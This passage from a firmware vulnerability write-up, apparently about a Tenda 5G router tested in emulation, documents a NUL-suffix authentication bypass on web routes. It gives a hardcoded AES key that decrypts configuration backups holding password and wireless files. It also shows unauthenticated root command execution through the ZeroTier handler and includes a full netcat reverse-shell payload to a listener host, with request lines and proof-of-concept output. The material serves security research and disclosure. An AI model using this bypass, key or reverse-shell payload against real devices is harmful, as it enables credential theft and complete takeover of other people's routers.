Connected to 172.17.0.3.
5ec0d2e4ac27 login:
```

The telnet route is therefore not only opening a socket; it is connected to the
native BusyBox `telnetd`/`login` path once the emulated chroot has working pty
devices.

## 27. Password-Configured Retest, Config Decode, And ZeroTier RCE Shell

After reconfiguring the native web runtime with an admin password, the firmware
state changed from first-run defaults back to the normal protected state:

```text
option quickset_cfg '0'
option userpass 'fbcd4667f4d4f5d27f4b1250fc051126'
```

This resolved the earlier ambiguity where plain protected routes were returning
`200` because the runtime still had first-run/default config:

```text
option quickset_cfg '1'
option userpass ''
```

With the password configured, the no-cookie baseline was protected again:

```text
GET /cgi-bin/DownloadCfg
-> 302 Location: http://127.0.0.1:18080/login.html

GET /goform/zerotier
-> 302 Location: http://127.0.0.1:18080/login.html
```

The NUL-suffix route confusion still bypassed auth:

```text
GET /cgi-bin/DownloadCfg%00.js
-> 200, 16640 bytes
sha256=83069ef3122b261281bb946c95844576d08936f98b26691162ddbbd10cda7afa
```

The config-download PoC was updated to decode the backup as part of the PoC.
It now:

- saves the encrypted backup,
- decrypts the OpenSSL AES-128-ECB wrapper with key
  `4008dfec3c0e98c406b50f8749924008`,
- verifies the embedded MD5,
- extracts the gzip tarball,
- reports sensitive paths found in the archive.

Password-configured retest output:

```text
[baseline] GET /cgi-bin/DownloadCfg
  status=302 location=http://127.0.0.1:18080/login.html bytes=215
[exploit] GET /cgi-bin/DownloadCfg%00.js
  status=200 content_type= bytes=16640 sha256=83069ef3122b261281bb946c95844576d08936f98b26691162ddbbd10cda7afa
  saved=/tmp/download_cfg_after_password.bin
[decode] AES-128-ECB config wrapper
  decrypted=/tmp/download_cfg_after_password_decoded/decrypted.bin bytes=16637
  product=5G06V1.0-TDE01
  payload_md5=313b20206e5e76d56bd64557dced6824 verified=True
  tarball=/tmp/download_cfg_after_password_decoded/config.tgz bytes=16589
  listing=/tmp/download_cfg_after_password_decoded/files.txt files=49
  extracted=/tmp/download_cfg_after_password_decoded/extracted files=49
  sensitive_paths=etc/config/wireless,etc/config/pub,etc/config/cwmp,etc/config/wireguard,etc/passwd,etc/shadow
  nul_suffix_bypass=True
  baseline_download=False
  vulnerable=True
```

The earlier saved 16,720-byte artifact was also decoded successfully:

```text
path:          poc_out/download_cfg_noauth.bin
sha256:        5534dc4502743cd0006594f089c1abb675108661e723d71513e9543a371e7231
product:       5G06V1.0-TDE01
payload_md5:   64309d679b95b410f2695fbaebdb7ced
file_count:    49
```

The decode details were written to:

```text
CONFIG_BACKUP_DEEP_DIVE.md
tools/decode_tenda_config_backup.sh
pocs/poc_auth_bypass_download_cfg.py
```

The ZeroTier route was then retested in the password-configured state. Baseline
plain `/goform/zerotier` redirected to login, while the bypassed route fetched
an attacker-controlled `zerotier.tar`, extracted it, and executed
`/var/zerotier/start_zerotier.sh` as root:

```text
[exploit] GET /goform/zerotier%00.js?proto=http&url=172.17.0.1:38479
  status=502 body=b'{"errCode": 1, "error": "proxy upstream error"}'
[validation] marker=/tmp/zerotier_poc_rce
  vulnerable=True
  marker=ZEROTIER_POC_RCE
  id=uid=0(root) gid=0(root) groups=0(root)
```

The `502` is expected in this harness because the native handler emits a bare
success/error string that the local Python proxy treats as a bad upstream HTTP
response. The side effect still occurs before the proxy reports `502`.

Finally, a live reverse shell was confirmed against the host listener:

```text
host listener:
nc -l 4444

payload:
/bin/sh -i < /tmp/zt_rs_fifo 2>&1 | /usr/bin/nc 172.17.0.1 4444 > /tmp/zt_rs_fifo
```

The firmware fetched the malicious archive twice:

```text
archive_requests ['/zerotier.tar', '/zerotier.tar']
```

Runtime evidence after triggering the bypass:

```text
marker:
REV_SHELL_TRIGGERED

TCP:
172.17.0.1:4444 ESTAB 172.17.0.3:49154 users:(("nc",pid=3006542,fd=4))
```

This proves unauthenticated root command execution through the web management
interface when the route is reachable:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
```

Use `S:U` as the conservative default. Only use `S:C` if a scoring authority
explicitly treats root compromise of the appliance as crossing a separate
security authority.
